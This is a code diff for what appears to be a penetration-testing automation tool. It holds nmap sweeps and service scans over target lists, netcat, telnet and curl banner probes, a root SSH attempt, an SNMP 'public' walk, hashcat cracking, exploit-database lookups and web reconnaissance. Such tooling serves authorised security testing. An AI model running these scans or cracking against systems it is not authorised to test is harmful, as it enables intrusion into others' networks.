+        with open("ip_alive.ip", "r") as f:
+          orig_alive = f.readlines()
+      else:
+        orig_alive = []
+      for ip in ip_dict.keys():
+        if "up" in ip_dict[ip].values():
+          orig_alive.append(ip)
+
+      final_alive = list(map(lambda x:x.strip(),orig_alive))   # Remove Newlines
+      final_alive = sorted(list(dict.fromkeys(final_alive)))   # Remove Duplicates & Sort
+      with open("ip_alive.ip", "w") as f:
+        f.write("\n".join(final_alive)) 
+        
+      # Create Report
+      with open("ip_alive_report.txt", "a") as fil:
+        for ip in ip_dict.keys():
+          if "up" in ip_dict[ip].values():
+            outp_string = "| {:<15} | {:<6} | {:<6} | {:<6} | {:<6} | {:<6} | {:<6} | {:<6} | {:<6} |\n".format(
+              ip,
+              ip_dict[ip]["PING"], 
+              ip_dict[ip]["TIME"], 
+              ip_dict[ip]["SYN"], 
+              ip_dict[ip]["ACK"],
+              ip_dict[ip]["UDP"], 
+              ip_dict[ip]["AMQ"], 
+              ip_dict[ip]["SCTP"], 
+              ip_dict[ip]["IPP"])
+            fil.write(outp_string)
+            tqdm.write(outp_string, end="")
+      # Save State
+      with open("b.state", "a") as fil:
+        last_key = list(ip_dict.keys())[-1]
+        fil.write("deepscan " + last_key + "\n")
+    
+    init_sudo()
+    with open(target, "r") as f:
+      target_array = f.readlines()
+    target_array = list(map(lambda x:x.strip(),target_array))   # Remove Newlines
+    
+    # CHECK STATE
+    if "deepscan " in Breach.state:
+      for target in target_array:
+        if "deepscan " + target in Breach.state:
+          print("Found deepscan checkpoint. Resuming scan on: " + target)
+          target_index = target_array.index(target)
+          target_array = target_array[target_index + 1:]
+      
+    if len(target_array) > 50:
+      print(F"Splitting {len(target_array)} targets into chunks of 50..\n")
+      chunked_array = [' '.join(map(str, target_array[i:i+50])) for i in range(0, len(target_array), 50)]
+    else:
+      print(r"Less than 50 targets detected. tqdm will show 0% until done..")
+      chunked_array = [' '.join(target_array)]
+        
+    # Write Report Header
+    if os.path.isfile("ip_alive_report.txt"):
+      print(Breach.cyan + "Found ip_alive_report.txt file.. appending! \n\n" + Breach.endc)
+    else:
+      with open("ip_alive_report.txt", "w") as fil:
+        currentDate = datetime.datetime.now().strftime('%d.%m.%Y %H:%M:%S')
+        fil.write(f"\n\n{currentDate}\tAuflistung von reaktiven Hosts für die Netze:<br>\n")
+        fil.write(f"{Breach.orig_target}<br>\n\n")
+        fil.write("| {:<15} | {:<6} | {:<6} | {:<6} | {:<6} | {:<6} | {:<6} | {:<6} | {:<6} |\n".format("IP", "PING", "TIME", "SYN", "ACK", "UDP", "AMQ", "SCTP", "IPP"))
+        fil.write("| {:<15} | {:<6} | {:<6} | {:<6} | {:<6} | {:<6} | {:<6} | {:<6} | {:<6} |\n".format("---", "---", "---", "---", "---", "---", "---", "---", "---"))
+
+    for chunk in tqdm(chunked_array, leave=False):
+      ip_dict = {}
+      
+      for ip in chunk.split(" "):
+        ip_dict[ip] = {"PING": "", "TIME": "", "SYN": "", "ACK": "", "UDP": "", "AMQ": "", "SCTP": "", "IPP": ""}
+
+      ping_out = run_quick_cmd("sudo -S nmap -PE -n -sn " + chunk + " | grep up -B1 | grep report | cut -d' ' -f5")
+      for ip in ping_out.splitlines():
+        ip_dict[ip]["PING"] = "up"
+      time_out = run_quick_cmd("sudo -S nmap -PP -n -sn " + chunk + " | grep up -B1 | grep report | cut -d' ' -f5")
+      for ip in time_out.splitlines():
+        ip_dict[ip]["TIME"] = "up"
+      amq_out  = run_quick_cmd("sudo -S nmap -PM -n -sn " + chunk + " | grep up -B1 | grep report | cut -d' ' -f5")
+      for ip in amq_out.splitlines():
+        ip_dict[ip]["AMQ"] = "up"
+      sctp_out  = run_quick_cmd("sudo -S nmap -PY -n -sn " + chunk + " | grep up -B1 | grep report | cut -d' ' -f5")
+      for ip in sctp_out.splitlines():
+        ip_dict[ip]["SCTP"] = "up"
+      ipp_out  = run_quick_cmd("sudo -S nmap -PO -n -sn " + chunk + " | grep up -B1 | grep report | cut -d' ' -f5")
+      for ip in ipp_out.splitlines():
+        ip_dict[ip]["IPP"] = "up"
+      syn_out  = run_quick_cmd("sudo -S nmap -n -PS1,3,7,9,13,17,19,21-23,25-26,37,53,79-82,88,100,106,110-111,113,119,135,139,143-144,179,199,254-255,280,311,389,427,443-445,464-465,497,513-515,543-544,548,554,587,593,625,631,636,646,787,808,873,902,990,993,995,1000,1022,1024-1033,1035-1041,1044,1048-1050,1053-1054,1056,1058-1059,1064-1066,1069,1071,1074,1080,1110,1234,1433,1494,1521,1720,1723,1755,1761,1801,1900,1935,1998,2000-2003,2005,2049,2103,2105,2107,2121,2161,2301,2383,2401,2601,2717,2869,2967,3000-3001,3128,3268,3306,3389,3689-3690,3703,3986,4000-4001,4045,4899,5000-5001,5003,5009,5050-5051,5060,5101,5120,5190,5357,5432,5555,5631,5666,5800,5900-5901,6000-6002,6004,6112,6646,6666,7000,7070,7937-7938,8000,8002,8008-8010,8031,8080-8081,8443,8888,9000-9001,9090,9100,9102,9999-10001,10010,32768,32771,49152-49157,50000 -sn " + chunk + " | grep up -B1 | grep report | cut -d' ' -f5")
+      for ip in syn_out.splitlines():
+        ip_dict[ip]["SYN"] = "up"
+      ack_out  = run_quick_cmd("sudo -S nmap -n -PA21,22,23,25,53,79,80,88,110,111,113,137,145,443,445,8080,10042 -sn " + chunk + " | grep up -B1 | grep report | cut -d' ' -f5")
+      for ip in ack_out.splitlines():
+        ip_dict[ip]["ACK"] = "up"
+      udp_out  = run_quick_cmd("sudo -S nmap -n -PU53,67,123,135,137,138,161,445,500,631,1434,40125,50123,5060,3400 -sn " + chunk + " | grep up -B1 | grep report | cut -d' ' -f5")
+      for ip in udp_out.splitlines():
+        ip_dict[ip]["UDP"] = "up"
+        
+      create_deepscan_files(ip_dict)
+  elif Breach.service:
+    def targeted_nmap(name, chunked_array, ports, file, udp=False):
+      ''' return format (array) > "IP:PORT" '''
+      print(Breach.purple + "\n>>> Scanning for: "+ name + Breach.endc)
+
+      output_array = []
+      for chunk in tqdm(chunked_array, leave=False):
+        if udp:
+          output = run_quick_cmd(F"sudo -S nmap -sU -n -Pn -vv -p{ports} {chunk} | grep Discovered")
+        else:
+          output = run_quick_cmd(F"sudo -S nmap -sS -n -Pn -vv -p{ports} {chunk} | grep Discovered")
+        output = (output).split("\n")
+        output = list(filter(None, output)) # Remove Empty Elements
+        if output:
+          output_array = output_array + output
+          tqdm.write("\n".join(output).replace("Discovered open port ",""))
+      for i in range(len(output_array)):
+        output_array[i] = output_array[i].replace('Discovered open port ', '').replace('/tcp', '').replace('/udp', '').replace(' on ', ':')
+        ip_address, port = output_array[i].split(':')
+        output_array[i] = port + ':' + ip_address
+
+      if os.path.isfile(file):
+        with open(file, "r") as f:
+          orig_array = f.readlines()
+      else:
+        orig_array = []
+      
+      final_array = orig_array + output_array
+      final_array = list(map(lambda x:x.strip(),final_array))   # Remove Newlines
+      final_array = list(dict.fromkeys(final_array))            # Remove Duplicates
+      if len(final_array) > 0:
+        with open(file, "w") as f:
+          f.write('\n'.join(sorted(final_array)))
+      return final_array
+
+    init_sudo()
+    # ! Convert targets to array of chunks (size 50) with targets as string 
+    with open(target, "r") as f:
+      target_array = f.readlines()
+    target_array = list(map(lambda x:x.strip(),target_array))   # Remove Newlines
+    if len(target_array) > 50:
+      print(F"Splitting {len(target_array)} targets into chunks of 50..\n")
+      chunked_array = [' '.join(map(str, target_array[i:i+50])) for i in range(0, len(target_array), 50)]
+    else:
+      chunked_array = [' '.join(target_array)]
+    
+    # ! Services
+    if Breach.service == "http" or Breach.service == "all":
+      targeted_nmap("http", chunked_array, "80,8000,8008,8080,8888,8090,4443,4444,443,8443,591", "http.ip")
+    if Breach.service == "smb" or Breach.service == "all":
+      targeted_nmap("smb", chunked_array, "445,139", "smb.ip")
+    if Breach.service == "ssh" or Breach.service == "all":
+      targeted_nmap("ssh", chunked_array, "22", "ssh.ip")
+    if Breach.service == "rdp" or Breach.service == "all":
+      targeted_nmap("rdp", chunked_array, "3389", "rdp.ip")
+    if Breach.service == "telnet" or Breach.service == "all":
+      targeted_nmap("telnet", chunked_array, "23", "telnet.ip")
+    if Breach.service == "ns" or Breach.service == "all":
+      targeted_nmap("UDP ns", chunked_array, "53", "ns_udp.ip", udp=True)
+    if Breach.service == "ns" or Breach.service == "all":
+      targeted_nmap("TCP ns", chunked_array, "53", "ns_tcp.ip")
+    if Breach.service == "dc" or Breach.service == "all":
+      targeted_nmap("krb", chunked_array, "88,389", "krb.ip")
+    if Breach.service == "ldap" or Breach.service == "all":
+      targeted_nmap("ldap", chunked_array, "389,636,3268,3269", "ldap.ip")
+    if Breach.service == "winrm" or Breach.service == "all":
+      targeted_nmap("winrm", chunked_array, "5985,5986", "winrm.ip")
+    if Breach.service == "ftp" or Breach.service == "all":
+      targeted_nmap("ftp", chunked_array, "21,990", "ftp.ip")
+    if Breach.service == "mysql" or Breach.service == "all":
+      targeted_nmap("mysql", chunked_array, "3306", "mysql.ip")
+    if Breach.service == "vnc" or Breach.service == "all":
+      targeted_nmap("vnc", chunked_array, "5900", "vnc.ip")
+    if Breach.service == "mssql" or Breach.service == "all":
+      targeted_nmap("mssql", chunked_array, "1433", "mssql.ip")
+    if Breach.service == "vpn" or Breach.service == "all":
+      targeted_nmap("vpn", chunked_array, "500", "ike.ip")
+    if Breach.service == "postgre" or Breach.service == "all":
+      targeted_nmap("postgresql", chunked_array, "5453", "postgre.ip")
+    if Breach.service == "nfs" or Breach.service == "all":
+      targeted_nmap("nfs", chunked_array, "111,2049", "nfs.ip")
+    if Breach.service == "oracle" or Breach.service == "all":
+      targeted_nmap("oracle db", chunked_array, "1521", "oracledb.ip")
+    if Breach.service == "snmp" or Breach.service == "all":
+      targeted_nmap("snmp", chunked_array, "161,162,10161,10162", "snmp.ip", udp=True)
+    if Breach.service == "printer" or Breach.service == "all":
+      targeted_nmap("printer", chunked_array, "515,631,9100", "printer.ip")
+    if Breach.service == "common" or Breach.service == "all":
+      targeted_nmap("common", chunked_array, "5000,3000,9000", "common.ip")
+  elif Breach.split:
+    splitsize = 500
+    countfile = 1
+    lincount = 0
+    with open(Breach.orig_target, 'r') as input_file:
+      for line in input_file:
+        if countfile < 10:
+          output_file = f'ip_split_0{countfile}.ip'
+        else:
+          output_file = f'ip_split_{countfile}.ip'
+        with open(output_file, 'a') as output:
+          output.write(line)
+        lincount += 1
+        if lincount == splitsize:
+          countfile += 1
+          lincount = 0 
+    print(f'Done splitting. Created {countfile} files.')
+  elif Breach.convert:
+    with open(target, "r") as f:
+      for line in f.readlines():
+        print(line.strip())
+    print("\n\nUpdating ip_scope.ip")
+    run_quick_cmd(F'echo "\n$(cat {target})" >> ip_scope.ip && cat ip_scope.ip | sed \'/^$/d\' | sort -u -o ip_scope.ip')
+  elif Breach.namescan:
+    print("Checking hostnames.. make sure /etc/resolv.conf is setup")
+    if "ip_scope" in Breach.orig_target:
+      input("You selected ip_scope.ip as input, all hosts with a rDNS entry will be added to ip_alive.ip. Press enter to continue...")
+    with open(target, "r") as f:
+      ip_array = f.readlines()
+      
+    if os.path.isfile("ip_names.ip"):
+      with open("ip_names.ip", "r") as f:
+        hostname_array = f.readlines()
+    else:
+      hostname_array = []
+      
+    if os.path.isfile("ip_alive.ip"):
+      with open("ip_alive.ip", "r") as f:
+        alive_array = f.readlines()
+    else:
+      alive_array = []
+    
+    if os.path.isfile("domain_subs.domain"):
+      with open("domain_subs.domain", "r") as f:
+        subs_array = f.readlines()
+    else:
+      subs_array = []
+
+    for ip in tqdm(ip_array, leave=False):
+      ip = ip.replace("\n", "")
+      digout = run_quick_cmd(F"dig +short -x {ip}")
+      digout = digout.split("\n")
+      for name in digout:
+        name = name.strip()
+        if (not "arpa" in name) and (not "googleusercontent" in name) and (not "communications error" in name) and (name != ""):
+          name = name[:-1] if name.endswith('.') else name
+          name = name.replace('\n', '')
+          tqdm.write(F"{ip}\t\t{name}")
+          hostname_array.append(F"{ip}:{name}")
+          alive_array.append(ip)
+          subs_array.append(name)
+        
+    hostname_array = list(map(lambda s: s.strip(), hostname_array))   # Remove Newlines
+    hostname_array = list(dict.fromkeys(hostname_array))              # Remove Duplicates
+    alive_array = list(map(lambda s: s.strip(), alive_array))         # Remove Newlines
+    alive_array = list(dict.fromkeys(alive_array))                    # Remove Duplicates
+    subs_array = list(map(lambda s: s.strip(), subs_array))         # Remove Newlines
+    subs_array = list(dict.fromkeys(subs_array))                    # Remove Duplicates
+    
+    with open("ip_names.ip", "w") as f:
+      f.write('\n'.join(sorted(hostname_array)))
+    with open("ip_alive.ip", "w") as f:
+      f.write('\n'.join(sorted(alive_array)))
+    with open("domain_subs.domain", "w") as f:
+      f.write('\n'.join(sorted(subs_array)))
+  else:
+    print("No valid submodule selected")
+    os.system(sys.argv[0] + " net -h")
+    sys.exit(1)
+
+def breach_domain(target):
+  if Breach.osint:
+    if target.count('.') > 1:
+      input(F"{Breach.red}[!] breach domain -o is meant to be run on root domains. breach domain -i may be run on subs.\nPress Enter to continue anyways...")
+    osint_domain(target); return
+  elif Breach.ip_lookup:
+    ips = set()
+    try:
+      for i in range(5):  # do 5 lookups to catch load balancers
+        new_ips = set(i[4][0] for i in socket.getaddrinfo(target, None))
+        if new_ips.issubset(ips):
+          break
+        ips.update(new_ips)
+    except:
+      pass
+    
+    if len(ips) == 0:
+      tqdm.write(F"{Breach.red}[-] No mapping found for {target}{Breach.endc}")
+      with open("domain_unmapped.txt", 'a+') as f:
+        f.seek(0)
+        if target not in f.read():
+          f.write(F'\n{target}')
+    elif len(ips) > 1:
+      tqdm.write(F"{Breach.cyan}[!] Load balancer found for {target}{Breach.endc}")
+      
+    for ip in ips:      
+      if ipaddress.ip_address(ip).version == 6:
+        with open("ip_names_v6.ip", 'a+') as f:
+          f.seek(0)
+          if ip not in f.read():
+            tqdm.write(F'\n{ip}:{target}')
+            f.write(F'\n{ip}:{target}')
+        os.system("sort -u ip_names_v6.ip -o ip_names_v6.ip && sed -i '/^$/d' ip_names_v6.ip")
+      else:
+        with open("ip_names.ip", 'a+') as f:
+          f.seek(0)
+          if ip not in f.read():
+            tqdm.write(F'\n{ip}:{target}')
+            f.write(F'\n{ip}:{target}')
+        os.system("sort -u ip_names.ip -o ip_names.ip && sed -i '/^$/d' ip_names.ip")
+        if ip.startswith("192.") or ip.startswith("172.") or ip.startswith("10."):
+          bydns = False # write a separate file with ips which are not in scope but were identified by domains/subs
+          if ip not in open('ip_scope.ip').read():
+            bydns = True
+            with open("ip_bydns.ip", "a") as fil:
+              fil.write("\n" + ip)
+          if bydns:
+            os.system("sort -u ip_bydns.ip -o ip_bydns.ip && sed -i '/^$/d' ip_bydns.ip")
+        else:
+          # on public ips we also do a quick osint check (check for shared hosting and check for more subs)
+          rapid_check_shared(ip)
+  else:
+    print(Breach.red + "No domain param given." + Breach.endc)
+    print("-i   translate domains to ips and append to ip_alive.ip")
+    print("-o   do domain osint")
+    sys.exit(1)
+
+def breach_app(target):
+  search = target + " " + " ".join(Breach.searchterm)
+  print(search)
+
+  open = webbrowser.open_new_tab
+  open(F"https://www.exploit-db.com/")
+  open(F"https://exploits.shodan.io/?q={search}")
+  open(F"https://sploitus.com/?query={search}#exploits")
+  open(F"https://packetstormsecurity.com/search/?q={search}")
+  open(F"https://www.google.com/search?q={search}+exploit")
+  open(F"https://www.google.com/search?q={search}+exploit+github")
+  open(F"https://www.google.com/search?q={search}+default+password")
+
+  # TODO: extended
+  # https://www.cvedetails.com/google-search-results.php?q={search}
+  # https://book.hacktricks.xyz/welcome/readme?q={search}
+  # https://ippsec.rocks/?#
+
+  if Breach.reverse:
+    excluded = "|".join(Breach.reverse)
+    print(check_output(F"searchsploit {search} --exclude='{excluded}'", shell="/bin/bash").decode("UTF-8"))
+    print("Searching for Metasploit Modules...")
+    print(check_output(F"msfconsole -qx 'grep -v {excluded} search {search};exit'", shell="/bin/bash").decode("UTF-8"))
+  else:
+    print(check_output(F"searchsploit {search}", shell="/bin/bash").decode("UTF-8"))
+    print("Searching for Metasploit Modules...")
+    print(check_output(F"msfconsole -qx 'search {search};exit'", shell="/bin/bash").decode("UTF-8"))
+
+  pyperclip.copy(search)
+  print("Appname copied to Clipboard")
+  print(F"Remember to update searchsploit regulary!")
+  print("Run: \033[91msudo searchsploit -u\033[0m")
+  print(F"Look for default credentials / locations etc. now!")
+
+def breach_unknown(target):
+  if ":" in target:
+    port = target.split(":")[1]
+    target = target.split(":")[0]
+  else:
+    tqdm.write(F"{Breach.red}NO PORT GIVEN FOR HOST: {target}.. skipping")
+    return
+  
+  # NC
+  run_cmd(F"echo HELP | nc -nv {target} {port}", "unknown.md", target, line_wl=["succeeded"], tout=2)
+  run_cmd(F"echo HELP | nc -nvu {target} {port}", "unknown.md", target, line_wl=["succeeded"], tout=2)
+  run_cmd(F"echo ? | nc -nv {target} {port}", "unknown.md", target, line_wl=["succeeded"], tout=2)
+  run_cmd(F"echo ? | nc -nvu {target} {port}", "unknown.md", target, line_wl=["succeeded"], tout=2)
+  run_cmd(F"echo OPTIONS | nc -nv {target} {port}", "unknown.md", target, line_wl=["succeeded"], tout=2)
+  run_cmd(F"echo OPTIONS | nc -nvu {target} {port}", "unknown.md", target, line_wl=["succeeded"], tout=2)
+  # TELNET
+  run_cmd(F"echo HELP | telnet {target} {port}", "unknown.md", target, tout=2)
+  run_cmd(F"echo ? | telnet {target} {port}", "unknown.md", target, tout=2)
+  # HTTP
+  run_cmd(F"curl -v http://{target}:{port}", "unknown.md", target, tout=2)
+  run_cmd(F"curl -v -k https://{target}:{port}", "unknown.md", target, tout=2)
+  # FTP
+  run_cmd(F"curl -v ftp://{target}:{port}", "unknown.md", target, tout=2)
+  # SSH
+  run_cmd(F"ssh root@{target} -p {port}", "unknown.md", target, tout=2)
+  # SSL
+  run_cmd(F"openssl s_client -connect {target}:{port}", "unknown.md", target, tout=2)
+  # SNMP
+  run_cmd(F"snmpwalk -v2c -c public {target}", "unknown.md", target, tout=2)
+  # MAIL
+  run_cmd(F"echo -e 'EHLO example.com\\r\\nQUIT' | nc {target} {port}", "unknown.md", target, tout=2)
+  run_cmd(F"echo -e 'USER user@example.com\\r\\nPASS secret\\r\\nQUIT' | nc {target} {port}", "unknown.md", target, tout=2)
+  run_cmd(F"echo -e 'a1 LOGIN user@example.com secret\\r\\na2 LOGOUT' | nc {target} {port}", "unknown.md", target, tout=2)
+
+def breach_hash(target):
+  open = webbrowser.open_new_tab
+  # print(target)
+  if Breach.mode:
+    print("Cracking Hash: " + target)
+    cmd = F"hashcat '{target}' -a 0 -w 4 -O -m {Breach.mode} --status $wl/crack/pw_breachyou.txt"
+    p = Popen(cmd, shell=True, stdout=PIPE, stderr=STDOUT)
+    for line in iter(p.stdout.readline, b''):
+      print(line.decode().rstrip())
+    p.stdout.close()
+    p.wait()
+  elif Breach.extended:
+    print(run_quick_cmd(F"hashid -e -m -j '{target}'"))
+    print(run_quick_cmd(F"echo '{target}' | hash-identifier 2>/dev/null | grep '[+]'"))
+    open('https://hashcat.net/wiki/doku.php?id=example_hashes')
+    open('https://hashes.com/en/tools/hash_identifier')
+    open('https://www.tunnelsup.com/hash-analyzer')
+    pyperclip.copy(str(target))
+    print("Hash copied to Clipboard")
+  else:
+    print(run_quick_cmd(F"hashid -m -j '{target}' | head -n4"))
+
+def breach_http(target):
+  def read_http_ip(target):
+    Breach.post.append("sort -u http.url -o http.url && sed -i '/^$/d' http.url")
+    
+    # check if http or https is used
+    ip = target.split(":")[0]
+    port = target.split(":")[1]
+    if port == "80":
+      port = ""
+      prot = "http://"
+    elif port == "443":
+      port = ""
+      prot = "https://"
+    else:
+      port = ":" + port
+      prot = run_quick_cmd(F'curl -k -s --connect-timeout 2 https://{ip}{port} >/dev/null && echo "https://" || echo "http://"')
+      prot = prot.strip()
+
+    # collect possible virtual hosts (include url with ip always)
+    url_array = [F"{prot}{ip}{port}"]
+    hostname_array = open("ip_names.ip", "r").readlines() if os.path.isfile("ip_names.ip") else []
+
+    for hostname in hostname_array:
+      if hostname.split(":")[0] == ip and not any(x in hostname.split(":")[1] for x in ["googleusercontent", "akamai"]):
+        domain = hostname.split(":")[1].replace("\n","")
+        url_array.append(F"{prot}{domain}{port}")
+    url_array = url_array[1:] + url_array[:1] # always prefer hostname over ip (if it exists)
+    
+    # stop if url was already checked
+    if os.path.exists("http.url"):
+      with open("http.url", "r") as fil:
+        urls = fil.readlines()
+      if any(url.strip() in url_array for url in urls):
+        tqdm.write(F"{ip}{port} was already checked.. skipping.")
+        return
+    
+    # identify unique urls
+    hash_dict = {}
+    unique_urls = []
+    for url in url_array:
+      try:
+        response = requests.get(url, verify=False, timeout=2)
+        if "google.com" in response.url or "bing.com" in response.url:
+          tqdm.write(F"{Breach.red}[!] {url} redirects to {response.url} ! Skipping..{Breach.endc}")
+          continue
+        hash_response = hashlib.md5(response.text.encode()).hexdigest()
+        if hash_response not in hash_dict:
+          hash_dict[hash_response] = url
+          unique_urls.append(url)
+      except:
+        pass
+    
+    with open("http.url", "a") as fil:
+      for url in unique_urls:
+        tqdm.write(url)
+        fil.write("\n" + url)
+  def clean_http_url(target):
+    hash_dict = {}
+    unique_urls = []
+    final_urls = []
+    duplicate_urls = []
+    
+    with open(target, "r") as fil:
+      url_array = [line.strip() for line in fil]
+    for url in url_array:
+      try:
+        response = requests.get(url, verify=False, timeout=5)
+        final_url = response.url # replace url with final destination (after redirects)
+        if response.status_code in [401, 403]:
+          append_unique(url, "http_403.url")
+                  
+        hash_response = hashlib.md5(response.text.encode()).hexdigest()
+        if hash_response not in hash_dict:
+          tqdm.write(url)
+          hash_dict[hash_response] = url
+          unique_urls.append(url)
+          final_urls.append(final_url)
+        else:
+          duplicate_urls.append(url)
+      except requests.exceptions.RequestException as err:
+        tqdm.write(f"Connection Error on: {url}, error details: {err}")
+      except:
+        tqdm.write("Connection Error on: " + url)
+    
+    for url in unique_urls:
+      append_unique(url, "http_clean.url")
+    for url in final_urls:
+      append_unique(url, "http_final.url")
+    for url in duplicate_urls:
+      append_unique(url, "http_dups.url")  
+  def get_http_info(target):
+    Breach.post.append("sort -u http_tits.txt | sort -k 2 > /tmp/httptits && mv /tmp/httptits http_tits.txt")
+    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36'}
+    try:
+      session = requests.Session()
+      response = session.get(target, headers=headers, verify=False, allow_redirects=True, timeout=(2,4))
+      status = response.status_code
+      soup = BeautifulSoup(response.text, 'html.parser')
+      title = soup.title.string if soup.title else 'Empty Title'
+      path = response.url.split("/")[3:]
+      if len(path) > 1:
+        path = '(' + "/".join(path) + ')'
+      else:
+        path = ""
+    except:
+      tqdm.write(F"Timeout / Error on {target}")
+      title = "ERROR"
+      status = path = ""
+
+    with open("http_tits.txt", "a") as f:
+      f.write(f"{target: <30}{status:<5} {title} {path}\n")
+      
+    if (not os.path.isfile('Fehlende HTTP-Cookie-Attributes.txt')) or (not target in open('Fehlende HTTP-Cookie-Attributes.txt').read()):    
+      for cookie in session.cookies:
+        sec = httponly = False
+        if not any(s in cookie.name for s in ["marketing", "brot"]):
+          if cookie.secure:
+            sec = True
+          if cookie.has_nonstandard_attr('HttpOnly'):
+            httponly = True          
+          if not (sec and httponly):
+            if (not os.path.isfile('Fehlende HTTP-Cookie-Attributes.txt')) or (not "Auflistung von Hosts" in open('Fehlende HTTP-Cookie-Attributes.txt').read()):
+              with open('Fehlende HTTP-Cookie-Attributes.txt', 'a') as f:
+                f.write(f"Auflistung von Hosts mit schwacher Cookie Konfiguration:\n\n")
+            with open('Fehlende HTTP-Cookie-Attributes.txt', 'a') as f:
+              f.write(f"\n{target}: {cookie.name}={cookie.value}\n")
+              if not sec: f.write("secure\n")
+              if not httponly: f.write("httpOnly\n")
+  def get_http_title(target):
+    if not Breach.driver:
+      init_driver()
+      Breach.post.append("sort -u http_tits.txt | sort -k 2 > /tmp/httptits && mv /tmp/httptits http_tits.txt")
+      Breach.driver.set_page_load_timeout(5) # sets a 10 second timeout for page load
+    try:
+      Breach.driver.get(target)
+      title = Breach.driver.title
+      path = Breach.driver.current_url.split("/")[3:]
+      if len(path) > 1:
+        path = '(' + "/".join(path) + ')'
+      else:
+        path = ""
+    except:
+      title = "ERROR"
+      path = ""
+    status = run_quick_cmd(F"curl -L -k -m 4 -sI '{target}' | head -n1 | cut -d' ' -f2").replace('\n', ' ')
+    with open("http_tits.txt", "a") as f:
+      if title == "":
+        f.write(f"{target: <30}{status:<5} Empty Title {path}\n")
+      else:
+        f.write(f"{target: <30}{status:<5} {title} {path}\n")
+  def get_cookies(target):
+    if (not os.path.isfile('Fehlende HTTP-Cookie-Attributes.txt')) or (not target in open('Fehlende HTTP-Cookie-Attributes.txt').read()):
+      session = requests.Session()
+      try:
+        session.get(target, verify=False, allow_redirects=True, timeout=5)
+      except:
+        return      
+      for cookie in session.cookies:
+        sec = httponly = samesite = False
+        if not any(s in cookie.name for s in ["marketing", "brot"]):
+          if cookie.secure:
+            sec = True
+          if cookie.has_nonstandard_attr('HttpOnly'):
+            httponly = True
+          # samesite_value = getattr(cookie, 'samesite', 'samesite nicht gesetzt')
+          # print(samesite_value)
+          # if "strict" in samesite_value or "lax" in samesite_value:
+          #   samesite = True
+          
+          if not (sec and httponly):
+            if (not os.path.isfile('Fehlende HTTP-Cookie-Attributes.txt')) or (not "Auflistung von Hosts" in open('Fehlende HTTP-Cookie-Attributes.txt').read()):
+              with open('Fehlende HTTP-Cookie-Attributes.txt', 'a') as f:
+                f.write(f"Auflistung von Hosts mit schwacher Cookie Konfiguration:\n\n")
+            with open('Fehlende HTTP-Cookie-Attributes.txt', 'a') as f:
+              f.write(f"\n{target}: {cookie.name}={cookie.value}\n")
+              if not sec: f.write("secure\n")
+              if not httponly: f.write("httpOnly\n")
+              # if not samesite: f.write(samesite_value + "\n")
+                  
+  if Breach.osint: osint_http(target); return
+  if Breach.read: read_http_ip(target); return
+  if Breach.clean: clean_http_url(Breach.orig_target); sys.exit(0)
+  if not "http" in target:
+    print(F"{Breach.red}ERROR: Target Format = http(s)://audatis.de{Breach.endc}")
+    return
+  elif target[-1] == "/":       # Remove trailing / in url
+    target = target.rstrip("/")
+  
+  final_destination = run_quick_cmd("curl -m 5 -LsI "+ target +" | grep -i '^Location:' | awk '{print $2}' || echo " + target)
+  if any(s in final_destination for s in ["google", "bing"]):
+    tqdm.write(F"{Breach.red}{target} is redirecting to {final_destination.strip()}! Skipping..")
+    return  # quit if site is redirecting us to public sites
+
+  port = urlparse(target).port
+  port = port if port else ("443" if "https" in target else "80")
+  is_ssl = True if "https" in target else False
+  
+  fdom = target.split("/")[2]               # full domain       e.g. www.audatis.de
+  is_ip = bool(re.match(r"(\d{1,3}\.){3}\d{1,3}", fdom))
+  if not is_ip:
+    if (fdom.count(".") > 1) and (not fdom.startswith("www")):   # target is a subdomain and subdomain is not www
+      rdom = ".".join(fdom.split(".")[-3:])
+    else:
+      rdom = ".".join(fdom.split(".")[-2:]) # root domain       e.g. audatis.de
+    tld = rdom.split(".")[-1]               # top level domain  e.g. .de
+    domain = rdom.split(".")[-2]            # domain            e.g. audatis
+  
+  header = "-H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0'"
+  if Breach.header:
+    for head in Breach.header:
+      header += F" -H '{head}'"
+
+  pc = xp = pp = ""
+  if Breach.proxy:
+    pc = "proxychains -q "
+    xp = "-x " + Breach.proxy
+    pp = "-p " + Breach.proxy
+
+  if Breach.all:
+    Breach.basic = Breach.crawl = Breach.scan = True
+  elif not any([Breach.burp, Breach.firefox, Breach.basic, Breach.crawl, Breach.scan, Breach.slow, Breach.bo3]):
+    Breach.basic = Breach.crawl = True
+  
+  # ! -burp
+  if Breach.burp:
+    run_quick_cmd(F"curl -f -I -s -k -x http://127.0.0.1:8080 '{target}' | grep HTTP")
+
+  # ! -ff
+  if Breach.firefox:
+    filename = "http_ff_opened.txt"
+    opened_urls = set()  # use a set to hold unique urls
+    if os.path.exists(filename):
+      with open(filename, 'r') as file:
+        opened_urls = set(line.strip() for line in file)
+    if target in opened_urls:
+      tqdm.write(F"{target} was already opened.. skipping")
+    else:
+      run_quick_cmd(F"firefox {target}")
+      tqdm.write("Opening '"+ target +"' - Press Enter to continue")
+      input()
+      with open(filename, 'a') as file:
+        file.write(target + '\n')
+    
+
+  # ! -basic
+  if Breach.basic:
+    run_cmd(F"{pc}arjun -u '{target}' -m GET", "http_arjun.md", target, wl=["parameter detected", "Parameters found"])
+    run_cmd(F"curl -m 5 -f -I -s -k '{target}' {header} {xp} | tail -n +2", "http_header.md", target, line_bl=["date", "content-type", "content-length","server:", "X-Frame","X-XSS","Strict-Transport","X-Content-Type","Expires","Pragma","Connection:","Cache-control","Last-Modified","X-UA-Compatible","Location"])
+    run_cmd(F"{pc}whatweb '{target}' {header} -a 3 --color=never -p -Cookies,-Country,-Frame,-IP,-JQuery,-Script", "http_whatweb.md", target, tout=30, post=r'''
+            cat http_whatweb.md | sed 's/, /\n/g' | grep -v '# http' | sort -u > http_whatweb_clean.txt
+            ''')
+    run_cmd(F"curl -m 5 -s -L '{target}' {header} {xp} | grep -oP '^\s*(?://.*|<!--.*?-->|/\*.*)' ", "http_comm.md", target)
+    run_cmd(F"curl -m 5 -f -L -k {header} {xp} {target}/robots.txt", "http_robots.md", target, bl=["returned error","301","302","Empty reply from server","Connection reset by peer", "</title>"], tout=4)
